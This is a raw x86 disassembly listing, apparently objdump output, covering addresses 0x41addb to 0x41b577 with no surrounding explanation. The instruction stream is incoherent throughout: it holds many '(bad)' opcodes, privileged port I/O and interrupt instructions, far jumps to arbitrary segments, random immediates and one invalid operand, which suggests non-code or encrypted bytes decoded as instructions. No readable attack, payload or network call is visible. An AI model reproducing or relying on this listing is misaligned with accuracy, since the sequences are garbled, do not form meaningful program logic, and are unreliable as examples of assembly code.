  41addb:	adc    DWORD PTR [ebp-0x76],0x50
  41addf:	pop    eax
  41ade0:	jae    0x41ad6d
  41ade2:	pop    esi
  41ade3:	enter  0x7456,0x7e
  41ade7:	fistp  DWORD PTR [ebx+0x13a2ecc4]
  41aded:	mov    ebx,DWORD PTR ds:0x8e75606f
  41adf3:	pusha  
  41adf4:	in     eax,0x78
  41adf6:	(bad)  
  41adf7:	sbb    ah,BYTE PTR [ecx+0x7b3d3635]
  41adfd:	mov    eax,0xc1d6e9bc
  41ae02:	sahf   
  41ae03:	nop
  41ae04:	sti    
  41ae05:	ret    0x6d5b
  41ae08:	jmp    0x41ae82
  41ae0a:	xchg   esi,eax
  41ae0b:	js     0x41adca
  41ae0d:	(bad)  [ecx+edx*2+0x5bf8ad0b]
  41ae14:	retf   0x6a94
  41ae17:	lods   eax,DWORD PTR ds:[esi]
  41ae18:	mov    cl,0x8f
  41ae1a:	and    al,0xac
  41ae1c:	std    
  41ae1d:	jge    0x41ad9f
  41ae1f:	nop
  41ae20:	xor    ebx,DWORD PTR [edi-0x6204ccd7]
  41ae26:	add    DWORD PTR [ebx-0x357232c9],edi
  41ae2c:	vpandn ymm3,ymm3,YMMWORD PTR [edi-0x416d698f]
  41ae34:	cmp    DWORD PTR [edx-0x5e],0x43e255ce
  41ae3b:	push   edi
  41ae3c:	fnstenv [ecx-0x3c]
  41ae3f:	in     eax,0xa9
  41ae41:	cdq    
  41ae42:	dec    edi
  41ae43:	pop    edx
  41ae44:	mov    dh,BYTE PTR [ebx+0x64]
  41ae47:	push   ss
  41ae48:	in     al,0x46
  41ae4a:	test   DWORD PTR [ecx+0x65],ebx
  41ae4d:	icebp  
  41ae4e:	mov    bh,0xf0
  41ae50:	jmp    0xfaa870f8
  41ae55:	es pop edx
  41ae57:	stos   BYTE PTR es:[edi],al
  41ae58:	in     eax,dx
  41ae59:	les    esi,FWORD PTR es:[esi-0x4ac20e87]
  41ae60:	leave  
  41ae61:	lds    ecx,FWORD PTR [edi+0x648fdce5]
  41ae67:	push   0xcf36c616
  41ae6c:	mov    ecx,0xbaa9c93c
  41ae71:	in     eax,dx
  41ae72:	push   es
  41ae73:	stos   DWORD PTR es:[edi],eax
  41ae74:	retf   0xb544
  41ae77:	aas    
  41ae78:	nop
  41ae79:	in     al,dx
  41ae7a:	inc    esp
  41ae7b:	inc    ecx
  41ae7c:	pop    ecx
  41ae7d:	je     0x41ae10
  41ae7f:	enter  0x9244,0x45
  41ae83:	xchg   DWORD PTR [esi],eax
  41ae85:	imul   esi,DWORD PTR [eax-0x2b],0x7d
  41ae89:	ins    BYTE PTR es:[edi],dx
  41ae8a:	pop    edi
  41ae8b:	xchg   edx,eax
  41ae8c:	jb     0x41af06
  41ae8e:	aas    
  41ae8f:	les    esp,FWORD PTR ds:0x9852a7b5
  41ae95:	push   ds
  41ae96:	enter  0xa2f8,0x4e
  41ae9a:	or     eax,0x4c55f8b7
  41ae9f:	les    ecx,FWORD PTR [esi-0x1d4b9863]
  41aea5:	lods   al,BYTE PTR ds:[esi]
  41aea6:	pop    eax
  41aea7:	imul   ebp,DWORD PTR [edi-0x27328534],0xffffffdb
  41aeae:	adc    DWORD PTR [ebx+0x53],0x51fda2e7
  41aeb5:	add    eax,0xf085c812
  41aeba:	mov    bl,0x5e
  41aebc:	and    BYTE PTR [ecx-0x7a9ac146],0x8b
  41aec3:	and    ebp,esi
  41aec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aec6:	cmp    al,0xda
  41aec8:	rol    DWORD PTR [edx],1
  41aeca:	neg    BYTE PTR [ebx+eax*4]
  41aecd:	sub    BYTE PTR [eax+ebp*4-0x4c],cl
  41aed1:	mov    ebp,0xf99cf72e
  41aed6:	mov    al,0x33
  41aed8:	les    esp,FWORD PTR ss:[bx+si+0x6be]
  41aede:	inc    BYTE PTR [eax]
  41aee0:	pusha  
  41aee1:	int3   
  41aee2:	outs   dx,BYTE PTR ds:[esi]
  41aee3:	xchg   BYTE PTR [ebx],cl
  41aee5:	push   ds
  41aee6:	stc    
  41aee7:	cld    
  41aee8:	cmp    eax,0xf2a5645a
  41aeed:	nop
  41aeee:	test   edi,0x7808854d
  41aef4:	add    DWORD PTR [esp+ebx*8+0x599c059a],eax
  41aefb:	xchg   BYTE PTR [ebp-0x65a9efa3],dh
  41af01:	test   eax,0xadec994
  41af06:	and    BYTE PTR [edx+0x75],al
  41af09:	lea    esp,[ebx+edx*8]
  41af0c:	xor    eax,0x1301ef86
  41af11:	cwde   
  41af12:	jne    0x41af37
  41af14:	push   ebx
  41af15:	mov    dl,0xe2
  41af17:	sar    DWORD PTR [eax],1
  41af19:	cwde   
  41af1a:	daa    
  41af1b:	js     0x41af78
  41af1d:	sbb    ecx,edx
  41af1f:	adc    eax,0x6c32784
  41af24:	int    0x34
  41af26:	ror    cl,0xb5
  41af29:	cmc    
  41af2a:	jae    0x41af9f
  41af2c:	pusha  
  41af2d:	jmp    0x142aef7a
  41af32:	adc    al,0x55
  41af34:	fmul   QWORD PTR [edx]
  41af36:	dec    edi
  41af37:	push   edi
  41af38:	inc    ebx
  41af39:	push   eax
  41af3a:	xor    DWORD PTR [edx],ebp
  41af3c:	(bad)  
  41af3d:	adc    esi,DWORD PTR [esi-0x58]
  41af40:	mov    DWORD PTR [eax+ecx*8],eax
  41af43:	dec    ebp
  41af44:	xor    BYTE PTR [ebx-0x51],al
  41af47:	cdq    
  41af48:	ret    
  41af49:	add    bl,ah
  41af4b:	dec    eax
  41af4c:	dec    esp
  41af4d:	adc    edi,DWORD PTR [eax-0x4f0a3afc]
  41af53:	(bad)  
  41af54:	(bad)  
  41af55:	bound  ebx,QWORD PTR [edx]
  41af57:	pop    esp
  41af58:	push   edi
  41af59:	or     cl,BYTE PTR [ebp-0x4b]
  41af5c:	out    dx,al
  41af5d:	pop    ds
  41af5e:	mov    BYTE PTR [ebp+0xe1d46b4],ah
  41af64:	mov    al,ds:0x24ccc4cc
  41af69:	ds repz mov dl,0xeb
  41af6d:	std    
  41af6e:	jge    0x41af3a
  41af70:	test   eax,0xbb49918e
  41af75:	jl     0x41af6c
  41af77:	adc    eax,0x8ae5e4b5
  41af7c:	mov    esi,0xb26b6d26
  41af81:	mov    esi,0xaaffda8d
  41af86:	cmp    DWORD PTR [edi+0x2487cc70],0xffffffff
  41af8d:	pop    esi
  41af8e:	ret    0x4c89
  41af91:	jge    0x41af64
  41af93:	xor    eax,0x8d918e4f
  41af98:	pop    eax
  41af99:	fisub  DWORD PTR [ecx]
  41af9b:	cld    
  41af9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af9d:	pop    es
  41af9e:	dec    esi
  41af9f:	mov    dh,0xc7
  41afa1:	push   esi
  41afa2:	sahf   
  41afa3:	(bad)  
  41afa4:	push   ss
  41afa5:	mov    ah,0xe7
  41afa7:	dec    ebx
  41afa8:	mov    eax,ds:0x5cb86871
  41afad:	adc    DWORD PTR [esi],esi
  41afaf:	test   DWORD PTR [edi+0x4377d3f],eax
  41afb5:	jns    0x41af88
  41afb7:	inc    edx
  41afb8:	dec    ecx
  41afb9:	in     eax,dx
  41afba:	shl    BYTE PTR [edi],1
  41afbc:	enter  0xbb4c,0x23
  41afc0:	jp     0x41af53
  41afc2:	mov    WORD PTR [edx+0x1b],es
  41afc5:	mov    ds:0xa46641bb,al
  41afca:	sbb    al,0x1d
  41afcc:	shr    eax,0x86
  41afcf:	mov    esp,0x684efff3
  41afd4:	in     eax,0x3c
  41afd6:	mov    cl,0xbc
  41afd8:	sti    
  41afd9:	cwde   
  41afda:	add    BYTE PTR [esi-0x37],dl
  41afdd:	out    dx,al
  41afde:	pop    es
  41afdf:	or     al,bh
  41afe1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41afe3:	gs dec ebp
  41afe5:	jg     0x41afc8
  41afe7:	sahf   
  41afe8:	xchg   edx,eax
  41afe9:	fild   DWORD PTR [edx]
  41afeb:	inc    edx
  41afec:	inc    ecx
  41afed:	repz xor eax,0x6b93e82c
  41aff3:	or     DWORD PTR [esi-0x6aadd2aa],0x55
  41affa:	mov    ah,BYTE PTR [ebp-0x68e1f52]
  41b000:	pop    esp
  41b001:	loope  0x41b01f
  41b003:	pop    ecx
  41b004:	mov    esi,esi
  41b006:	popa   
  41b007:	aad    0x26
  41b009:	adc    al,0x62
  41b00b:	mov    dl,0xe9
  41b00e:	in     eax,dx
  41b00f:	sahf   
  41b010:	scas   eax,DWORD PTR es:[edi]
  41b011:	inc    eax
  41b012:	sub    dl,dl
  41b014:	mov    ds:0x671911df,eax
  41b019:	dec    esp
  41b01a:	cs push ds
  41b01c:	and    eax,0x6f7012d7
  41b021:	and    al,0xa9
  41b023:	int3   
  41b024:	rol    DWORD PTR [esi-0x4e],cl
  41b027:	scas   al,BYTE PTR es:[edi]
  41b028:	mov    bl,0x33
  41b02a:	dec    ebx
  41b02b:	fnstsw WORD PTR [esi]
  41b02d:	mov    edx,0xddde856d
  41b032:	mov    DWORD PTR [ecx],ebx
  41b034:	aad    0x13
  41b036:	adc    eax,0x75cffe02
  41b03b:	(bad)  
  41b03c:	cmp    al,0x15
  41b03e:	mov    al,0x23
  41b040:	js     0x41b0b7
  41b042:	ret    0x6694
  41b045:	xchg   BYTE PTR [esi-0xd04397e],dl
  41b04b:	std    
  41b04c:	pop    eax
  41b04d:	jg     0x41afeb
  41b04f:	cmp    DWORD PTR ds:0x68f533d,esp
  41b055:	sbb    al,BYTE PTR [edi-0x440e45f1]
  41b05b:	mov    bh,0x46
  41b05d:	jno    0x41b06e
  41b05f:	sbb    al,0x47
  41b061:	mov    ch,0x41
  41b063:	cli    
  41b064:	push   ss
  41b065:	(bad)  
  41b066:	xchg   ebx,eax
  41b067:	jnp    0x41b070
  41b069:	je     0x41b06e
  41b06b:	mov    eax,0x441f4a4d
  41b070:	mov    ds:0xf8af7448,al
  41b075:	arpl   si,bp
  41b077:	(bad)  
  41b078:	mov    ecx,ecx
  41b07a:	cmc    
  41b07b:	int    0x5e
  41b07d:	cs pop ebp
  41b07f:	xchg   ebx,eax
  41b080:	popa   
  41b081:	daa    
  41b082:	shl    DWORD PTR [ecx+0x7b49017e],0x8c
  41b089:	ja     0x41b105
  41b08b:	jecxz  0x41b00f
  41b08d:	xchg   ecx,eax
  41b08e:	dec    edx
  41b08f:	and    ecx,0x30
  41b092:	or     eax,esp
  41b094:	(bad)  
  41b095:	mov    esi,DWORD PTR [esp+edx*4+0x223a2a41]
  41b09c:	pop    esi
  41b09d:	xchg   esi,eax
  41b09e:	fldenv [edx+0x49]
  41b0a1:	cs leave 
  41b0a3:	in     eax,0xad
  41b0a5:	jl     0x41b0a5
  41b0a7:	pop    edx
  41b0a8:	sbb    bl,BYTE PTR [edx-0x6b0ae4a2]
  41b0ae:	rcr    dh,1
  41b0b0:	sbb    al,0xcb
  41b0b2:	test   esi,edi
  41b0b4:	scas   eax,DWORD PTR es:[edi]
  41b0b5:	bound  ecx,QWORD PTR [di-0x7]
  41b0b9:	pop    ecx
  41b0ba:	sub    bl,BYTE PTR [edx-0x6ec32846]
  41b0c0:	jmp    0xa622:0x15f69cc7
  41b0c7:	mov    ds:0xe8778cd4,al
  41b0cc:	inc    edx
  41b0cd:	xchg   ebp,eax
  41b0ce:	xchg   edi,eax
  41b0cf:	jo     0x41b119
  41b0d1:	push   ds
  41b0d2:	stc    
  41b0d3:	rcr    DWORD PTR [ebp+0x6b7adafe],1
  41b0d9:	jle    0x41b0a2
  41b0db:	cmp    eax,0x1b64d6aa
  41b0e0:	call   0x5bc8:0x16eecdd8
  41b0e7:	sbb    ch,BYTE PTR [ecx]
  41b0e9:	xor    ch,BYTE PTR [ebp+0x4c]
  41b0ec:	mov    dl,0x33
  41b0ee:	lock pop edi
  41b0f0:	in     eax,0x8b
  41b0f2:	inc    ecx
  41b0f3:	inc    esi
  41b0f4:	jns    0x41b102
  41b0f6:	(bad)  
  41b0f7:	test   DWORD PTR [ecx+0x6f],ebp
  41b0fa:	ja     0x41b139
  41b0fc:	cmp    DWORD PTR [edi-0x7d],ebx
  41b0ff:	stos   BYTE PTR es:[edi],al
  41b100:	pop    ebx
  41b101:	inc    esi
  41b102:	xchg   BYTE PTR [edi+0x4253084c],dl
  41b108:	ins    DWORD PTR es:[edi],dx
  41b109:	mov    eax,ds:0xec667fb
  41b10e:	ins    DWORD PTR es:[edi],dx
  41b10f:	fbld   TBYTE PTR [eax+0x3b]
  41b112:	mov    esi,0x296afbeb
  41b117:	test   BYTE PTR [edi+0x7e84abdb],dl
  41b11d:	ret    
  41b11e:	mov    ebx,0xc7f877ed
  41b123:	int    0x94
  41b125:	xchg   ch,ch
  41b127:	retf   
  41b128:	push   es
  41b129:	clc    
  41b12a:	imul   eax,DWORD PTR [esi],0x81dfe9ff
  41b130:	jmp    0x471d:0xb0915bc4
  41b137:	push   ss
  41b138:	inc    edi
  41b139:	inc    edx
  41b13a:	mov    eax,0xea2bb63d
  41b13f:	adc    al,0xa7
  41b141:	inc    ebp
  41b142:	jp     0x41b14c
  41b144:	mov    dl,BYTE PTR [esi]
  41b146:	lock mov ebp,0xe74dbd47
  41b14c:	sti    
  41b14d:	mov    al,ds:0x1784d8d1
  41b152:	dec    edx
  41b153:	fcom   st(2)
  41b155:	xchg   BYTE PTR [eax],ah
  41b157:	inc    ebx
  41b158:	sub    bh,ah
  41b15a:	xor    al,0x17
  41b15c:	int    0xb6
  41b15e:	dec    esp
  41b15f:	mov    ds:0x57a71837,al
  41b164:	test   DWORD PTR [edi],edi
  41b166:	fbstp  TBYTE PTR ds:0x339feeec
  41b16c:	push   ecx
  41b16d:	and    cl,al
  41b16f:	cld    
  41b170:	popf   
  41b171:	fbld   TBYTE PTR [eax+0x7e046c8e]
  41b177:	mov    eax,ds:0x53e28273
  41b17c:	or     eax,0x17f9b764
  41b181:	(bad)  
  41b182:	int3   
  41b183:	(bad)  
  41b185:	or     ch,BYTE PTR [eax-0x259b29a]
  41b18b:	pop    edx
  41b18c:	mov    al,ds:0xb516107e
  41b191:	fadd   st(0),st
  41b193:	jecxz  0x41b11e
  41b195:	adc    eax,0xa1b758fb
  41b19a:	call   0x28f859fe
  41b19f:	ja     0x41b1a2
  41b1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1a2:	rcr    BYTE PTR [ecx],1
  41b1a4:	pop    ecx
  41b1a5:	aaa    
  41b1a6:	or     ebp,esi
  41b1a8:	xchg   ebx,eax
  41b1a9:	pushf  
  41b1aa:	hlt    
  41b1ab:	mov    cl,0x2e
  41b1ad:	fcmovu st,st(6)
  41b1af:	das    
  41b1b0:	je     0x41b16b
  41b1b2:	retf   0x8ed9
  41b1b5:	push   cs
  41b1b6:	mov    eax,0x66b8af51
  41b1bb:	cmp    DWORD PTR [edi+0x6d04f3a9],eax
  41b1c1:	mov    esi,0x2dd6c808
  41b1c6:	test   BYTE PTR [edi-0x74],ah
  41b1c9:	sub    ecx,esp
  41b1cb:	jl     0x41b1fb
  41b1cd:	push   ebp
  41b1ce:	lea    esp,[ecx+0x2f455180]
  41b1d4:	add    eax,0xb3d4e108
  41b1d9:	imul   BYTE PTR [edi+esi*2]
  41b1dc:	fisub  DWORD PTR [edi-0x26c0c539]
  41b1e2:	xchg   ecx,eax
  41b1e3:	xchg   ecx,eax
  41b1e4:	cmp    dh,0x51
  41b1e7:	adc    eax,0x3430e50c
  41b1ec:	mov    esp,0xe8befa5
  41b1f1:	mov    esp,0xe91dd1ee
  41b1f6:	dec    edx
  41b1f7:	outs   dx,DWORD PTR ds:[esi]
  41b1f8:	jne    0x41b18b
  41b1fa:	xor    eax,0x9ab8a98b
  41b1ff:	rcl    dl,cl
  41b201:	stc    
  41b202:	xchg   edx,eax
  41b203:	ds add BYTE PTR cs:[ecx-0x72fb17fd],ah
  41b20b:	sbb    ah,0x39
  41b20e:	xlat   BYTE PTR ds:[ebx]
  41b20f:	mov    al,ds:0x8bfc1363
  41b214:	ja     0x41b23b
  41b216:	cld    
  41b217:	sbb    dh,BYTE PTR [ebx]
  41b219:	ret    
  41b21a:	in     al,dx
  41b21b:	cli    
  41b21c:	push   ebx
  41b21d:	mov    edi,DWORD PTR [esi+0x1c0a9000]
  41b223:	dec    ebx
  41b224:	scas   eax,DWORD PTR es:[edi]
  41b225:	mov    edx,0xfb524379
  41b22a:	fs jb  0x41b1b5
  41b22d:	iret   
  41b22e:	ror    DWORD PTR [edi-0x5e6373f],1
  41b234:	pushf  
  41b235:	dec    eax
  41b236:	xor    al,0x75
  41b238:	loopne 0x41b1eb
  41b23a:	mov    ch,0x9a
  41b23c:	mov    ebx,0x7c4ed3c0
  41b241:	xchg   esp,eax
  41b242:	dec    esi
  41b243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b244:	jne    0x41b210
  41b246:	sbb    al,0x69
  41b248:	xor    BYTE PTR [ebp-0x11345b7d],dl
  41b24e:	xchg   esi,eax
  41b24f:	sub    BYTE PTR [ebx-0x7077bc7e],dh
  41b255:	mov    cl,0xa6
  41b257:	nop
  41b258:	cmp    eax,DWORD PTR [edx-0xe56bf96]
  41b25e:	test   DWORD PTR [ebx-0x5a],0xc68f5682
  41b265:	push   esp
  41b266:	retf   
  41b267:	dec    edi
  41b268:	add    BYTE PTR [ebx],dh
  41b26a:	icebp  
  41b26b:	jp     0x41b284
  41b26d:	jo     0x41b29a
  41b26f:	out    0x2f,al
  41b271:	(bad)  
  41b273:	and    DWORD PTR [edx-0x729d1cf2],ebx
  41b279:	xor    DWORD PTR [edx+ebx*4+0x696e1a0c],0xffffff83
  41b281:	adc    cl,dl
  41b283:	test   DWORD PTR [esi],0x9ce60964
  41b289:	ret    0xefc1
  41b28c:	or     cl,BYTE PTR [edi-0x4ca1936a]
  41b292:	in     al,dx
  41b293:	les    ebx,FWORD PTR [edi+0x7b]
  41b296:	pop    edx
  41b297:	sbb    eax,0xca70c291
  41b29c:	jmp    0x776a:0xe27a69ba
  41b2a3:	mul    DWORD PTR [esi]
  41b2a5:	or     DWORD PTR [edx],ebx
  41b2a7:	jae    0x41b262
  41b2a9:	sahf   
  41b2aa:	jmp    0x61cd:0x14fc35ba
  41b2b1:	xchg   ebx,eax
  41b2b2:	(bad)  
  41b2b3:	stc    
  41b2b4:	sar    BYTE PTR [ebp+ebp*2+0x12],cl
  41b2b8:	add    esp,DWORD PTR [edi]
  41b2ba:	jle    0x41b2fd
  41b2bc:	out    dx,eax
  41b2bd:	dec    eax
  41b2be:	mov    dh,0xf
  41b2c0:	mov    dl,0x3a
  41b2c2:	sub    edx,esi
  41b2c4:	int    0x7b
  41b2c6:	stos   BYTE PTR es:[edi],al
  41b2c7:	cmp    esp,DWORD PTR [ebp+esi*2+0x3d346d70]
  41b2ce:	mov    ?,WORD PTR [ebp+eiz*8+0x3c]
  41b2d2:	push   ss
  41b2d3:	adc    DWORD PTR [esi],0xffffff96
  41b2d6:	popf   
  41b2d7:	loop   0x41b2d7
  41b2d9:	add    edx,DWORD PTR [ebx-0x5c6cdcc6]
  41b2df:	inc    ecx
  41b2e0:	dec    esp
  41b2e1:	adc    bl,BYTE PTR [esi-0x6c0b6037]
  41b2e7:	lods   al,BYTE PTR ds:[esi]
  41b2e8:	push   DWORD PTR [ecx+0x7cb0440b]
  41b2ee:	push   ebx
  41b2ef:	loopne 0x41b2fe
  41b2f1:	and    eax,0x807bcff0
  41b2f6:	or     al,0xc9
  41b2f8:	jecxz  0x41b330
  41b2fa:	mov    edi,DWORD PTR [ecx-0x62]
  41b2fd:	test   DWORD PTR [eax+0xe0fcf64],ebx
  41b303:	dec    ebp
  41b304:	mov    DWORD PTR [eax],esp
  41b306:	xchg   ecx,eax
  41b307:	jns    0x41b35a
  41b309:	jae    0x41b2ba
  41b30b:	jo     0x41b2d1
  41b30d:	xchg   ah,bh
  41b30f:	inc    ecx
  41b310:	sti    
  41b311:	sbb    ebp,DWORD PTR [eax-0x6ae7869d]
  41b317:	cld    
  41b318:	pop    ds
  41b319:	sub    DWORD PTR [esi+edi*4+0x5d],eax
  41b31d:	jecxz  0x41b361
  41b31f:	mov    ecx,0x234fc8c9
  41b324:	mov    ebp,0x3d127574
  41b329:	xchg   ah,bl
  41b32b:	jb     0x41b38d
  41b32d:	call   0x33ccadca
  41b332:	jno    0x41b2de
  41b334:	(bad)
  41b338:	adc    dl,BYTE PTR ds:0x5f73051e
  41b33e:	mov    dl,0xe
  41b340:	in     al,dx
  41b341:	lahf   
  41b342:	and    esi,DWORD PTR [ebx-0x4a]
  41b345:	xor    BYTE PTR [ebx],ch
  41b347:	je     0x41b387
  41b349:	inc    esp
  41b34a:	jmp    0x41b355
  41b34c:	outs   dx,BYTE PTR ds:[esi]
  41b34d:	imul   BYTE PTR [ebp-0x197d932f]
  41b353:	mov    edi,0xcdc537ac
  41b358:	add    ch,dh
  41b35a:	fwait
  41b35b:	or     DWORD PTR [ecx+ecx*4-0x68],ebp
  41b35f:	inc    ecx
  41b360:	mov    edx,0xccc9c229
  41b365:	lock push edi
  41b367:	mov    cl,0x3d
  41b369:	mov    bh,0xfc
  41b36b:	call   ebp
  41b36d:	jae    0x41b396
  41b36f:	inc    edx
  41b370:	retf   
  41b371:	pop    edx
  41b372:	cmp    DWORD PTR [esi],0x67b82ec3
  41b378:	sti    
  41b379:	sbb    al,0x1c
  41b37b:	sub    ebp,ebp
  41b37d:	arpl   WORD PTR [ecx],cx
  41b37f:	retf   0xfdda
  41b382:	xchg   BYTE PTR [ebp-0x5e],ah
  41b385:	lahf   
  41b386:	jns    0x41b3db
  41b388:	mov    ch,0x2
  41b38a:	popa   
  41b38b:	imul   esi,DWORD PTR [ebx+ebx*4-0x1],0xac242190
  41b393:	es scas eax,DWORD PTR es:[edi]
  41b395:	test   esi,esi
  41b397:	inc    esi
  41b398:	lds    eax,FWORD PTR [ebx+0x2f35c6c7]
  41b39e:	inc    esi
  41b39f:	cmp    bh,bl
  41b3a1:	hlt    
  41b3a2:	ja     0x41b3f0
  41b3a4:	and    ecx,eax
  41b3a6:	jae    0x41b3dc
  41b3a8:	les    ebp,FWORD PTR [ebx]
  41b3aa:	shl    DWORD PTR [edi-0x34],0x8f
  41b3ae:	sub    BYTE PTR [ebx-0x4],dh
  41b3b1:	push   cs
  41b3b2:	sbb    ah,BYTE PTR [ecx+ecx*2]
  41b3b5:	mov    esi,0xb14b0852
  41b3ba:	imul   esp,DWORD PTR [esi],0x56
  41b3bd:	pop    edi
  41b3be:	cmp    esp,esi
  41b3c0:	in     eax,0x32
  41b3c2:	rcl    DWORD PTR [ebx+0x412fe255],0xee
  41b3c9:	sub    cl,BYTE PTR [edx+0x775f2ceb]
  41b3cf:	inc    esi
  41b3d0:	setbe  BYTE PTR [ecx]
  41b3d3:	les    edi,FWORD PTR [eax-0x5b]
  41b3d6:	sbb    cl,bh
  41b3d8:	mov    esp,0x8d308740
  41b3dd:	imul   eax,DWORD PTR [ecx+0x18233120],0x3b1f1e63
  41b3e7:	pop    edi
  41b3e8:	sub    al,BYTE PTR [edx]
  41b3ea:	retf   0x5a4e
  41b3ed:	jne    0x41b3a5
  41b3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b3f0:	pop    esi
  41b3f1:	mov    ah,0x1e
  41b3f3:	dec    ebx
  41b3f4:	cwde   
  41b3f5:	jle    0x41b464
  41b3f7:	mov    ch,0x3e
  41b3f9:	stc    
  41b3fa:	rcr    edx,1
  41b3fc:	push   ecx
  41b3fd:	clc    
  41b3fe:	aam    0x7d
  41b400:	in     al,0xdc
  41b402:	(bad)  
  41b404:	stos   DWORD PTR es:[edi],eax
  41b405:	lods   eax,DWORD PTR ds:[esi]
  41b406:	fldcw  WORD PTR [edx-0x30]
  41b409:	mov    al,ds:0x6ecd3fe2
  41b40e:	xchg   ebp,eax
  41b40f:	sub    bh,BYTE PTR [ebp+0x4e]
  41b412:	je     0x41b42d
  41b414:	dec    esi
  41b415:	dec    edi
  41b416:	xchg   ebp,eax
  41b417:	clc    
  41b418:	rol    BYTE PTR [eax+0x54e900e2],1
  41b41e:	cmp    DWORD PTR [edi],ecx
  41b420:	jp     0x41b485
  41b422:	pop    eax
  41b423:	mov    edi,0xcec0b718
  41b428:	mov    BYTE PTR [ecx+0x73],cl
  41b42b:	adc    al,0x25
  41b42d:	add    DWORD PTR [eax+eax*8+0x22324197],ebx
  41b434:	and    DWORD PTR [ebx-0x27],esi
  41b437:	push   es
  41b438:	xchg   ebx,eax
  41b439:	shl    al,cl
  41b43b:	push   ebp
  41b43c:	cmp    BYTE PTR [esi+0x1d],ch
  41b43f:	cld    
  41b440:	or     al,0x7f
  41b442:	imul   ebp,ebx,0xbfca1aef
  41b448:	jge    0x41b49e
  41b44a:	xchg   DWORD PTR [ebx-0x560434ab],eax
  41b450:	int3   
  41b451:	bound  edi,QWORD PTR [ebp+0x65aeda6f]
  41b457:	rcl    DWORD PTR [esi],1
  41b459:	dec    edx
  41b45a:	mov    ah,0xe2
  41b45c:	hlt    
  41b45d:	loop   0x41b4ca
  41b45f:	ret    
  41b460:	mov    ecx,0x2a1c99bc
  41b465:	retf   0xeca6
  41b468:	add    al,BYTE PTR [esi+0x74df8f20]
  41b46e:	jmp    0x8b13:0xc4b89ee5
  41b475:	bound  ecx,QWORD PTR [ecx-0x54]
  41b478:	ret    0xec80
  41b47b:	push   es
  41b47c:	pop    DWORD PTR ds:0xccc1451c
  41b482:	xor    BYTE PTR [ecx+0x3619005d],dh
  41b488:	cmc    
  41b489:	inc    ecx
  41b48a:	xor    esi,DWORD PTR [ecx]
  41b48c:	push   ebx
  41b48d:	shr    bl,1
  41b48f:	rcr    DWORD PTR [esi],1
  41b491:	xchg   esp,eax
  41b492:	pop    edx
  41b493:	repnz sbb al,0xaf
  41b496:	cwde   
  41b497:	add    ecx,edi
  41b499:	adc    ebx,esi
  41b49b:	sti    
  41b49c:	cli    
  41b49d:	sbb    DWORD PTR [eax+0xd0cfc1],edi
  41b4a3:	inc    edi
  41b4a4:	adc    dh,bl
  41b4a6:	dec    ebp
  41b4a7:	pop    ds
  41b4a8:	push   eax
  41b4a9:	xor    eax,0xbb74dfb8
  41b4ae:	add    edx,DWORD PTR [edx-0x5a]
  41b4b1:	push   esp
  41b4b2:	pop    eax
  41b4b3:	push   edi
  41b4b4:	arpl   WORD PTR [edi+0x3f],bx
  41b4b7:	xor    eax,0xf63affd0
  41b4bc:	aam    0xc5
  41b4be:	and    BYTE PTR [ebp+0x11],bl
  41b4c1:	cli    
  41b4c2:	sar    BYTE PTR [esi+0x67],0x5
  41b4c6:	pop    ss
  41b4c7:	push   ebp
  41b4c8:	sar    ebx,1
  41b4ca:	sbb    al,0x39
  41b4cc:	sbb    ah,BYTE PTR [edi+0x4ce1507a]
  41b4d2:	fcom   QWORD PTR [eax]
  41b4d4:	cwde   
  41b4d5:	hlt    
  41b4d6:	jbe    0x41b503
  41b4d8:	push   ds
  41b4d9:	sbb    al,0x85
  41b4db:	pop    ebp
  41b4dc:	fisttp WORD PTR [ecx+0x3a]
  41b4df:	sti    
  41b4e0:	or     BYTE PTR [edx],cl
  41b4e2:	fadd   DWORD PTR [ebx]
  41b4e4:	ficom  WORD PTR [ebx-0x18911b98]
  41b4ea:	shl    BYTE PTR [ebx+ebx*2],0xe9
  41b4ee:	sti    
  41b4ef:	and    ah,BYTE PTR [esi]
  41b4f1:	cli    
  41b4f2:	jl     0x41b4f1
  41b4f4:	(bad)  
  41b4f5:	retf   0xf02e
  41b4f8:	xchg   ecx,eax
  41b4f9:	or     DWORD PTR ds:0x9d55a28f,edx
  41b4ff:	leavew 
  41b501:	mov    cl,0x38
  41b503:	push   0xd
  41b505:	xchg   edx,eax
  41b506:	jge    0x41b492
  41b508:	mov    ebp,0x75dec0f9
  41b50d:	sbb    DWORD PTR ds:[esi],ebx
  41b510:	jecxz  0x41b546
  41b512:	jb     0x41b578
  41b514:	xor    BYTE PTR [edi+eax*1],bl
  41b517:	sbb    edx,DWORD PTR [esi+0x16efa03e]
  41b51d:	xor    eax,0x4d43b79
  41b522:	je     0x41b531
  41b524:	imul   ebx,DWORD PTR [eax+0x231e945e],0xffffffc3
  41b52b:	out    dx,al
  41b52c:	sub    al,bl
  41b52e:	dec    esi
  41b52f:	das    
  41b530:	fidivr DWORD PTR [ecx+0x14]
  41b533:	sub    eax,0x83aee4a3
  41b538:	push   es
  41b539:	imul   ebp,DWORD PTR [esp+ecx*2+0x1],0x3102c724
  41b541:	mov    DWORD PTR [esi+0x54],edi
  41b544:	jg     0x41b551
  41b546:	add    al,0xe5
  41b548:	push   ebp
  41b549:	hlt    
  41b54a:	dec    edi
  41b54b:	xlat   BYTE PTR ds:[ebx]
  41b54c:	push   ebp
  41b54d:	xchg   ebp,eax
  41b54e:	int    0x21
  41b550:	jge    0x41b5b6
  41b552:	cmp    ebx,0x3b
  41b555:	xor    DWORD PTR [ebx+ebx*4-0x49],esp
  41b559:	sub    DWORD PTR [ecx-0x75],0xffffffda
  41b55d:	cmp    BYTE PTR [edi],bl
  41b55f:	outs   dx,DWORD PTR ds:[esi]
  41b560:	pop    es
  41b561:	mov    cl,0xaa
  41b563:	mov    al,0x76
  41b565:	(bad)  
  41b566:	addr16 pop ebp
  41b568:	std    
  41b569:	aad    0xd2
  41b56b:	out    0x9f,al
  41b56d:	sbb    ecx,DWORD PTR [esi+0x55]
  41b570:	scas   al,BYTE PTR es:[edi]
  41b571:	dec    edx
  41b572:	cmp    BYTE PTR [edx],dh
  41b574:	scas   eax,DWORD PTR es:[edi]
  41b575:	dec    edx
  41b576:	xchg   esp,eax
  41b577:	mov    ecx,DWORD PTR [esi]
